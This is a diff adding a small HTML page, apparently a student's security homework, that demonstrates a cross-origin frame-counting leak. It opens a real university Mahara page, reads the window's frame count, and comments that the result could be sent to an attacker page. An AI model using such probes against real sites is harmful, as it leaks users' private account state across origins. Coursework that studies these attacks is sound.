@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HW4 | Question3 | COUZI Remi</title>
+</head>
+<body>
+    <button onclick="exploit()">Launch</button>
+    <script>
+        const exploit = () => {
+            var win = window.open("https://mahara.ut.ee/artefact/internal/index.php");
+            setTimeout(() => {
+                console.log("%d frames detected", win.length); //print result
+                //Then can send the result via server logs to one of the attacker pages
+                win.close();
+            }, 1000); //wait 1s
+        }
+    </script>
+</body>
+</html>
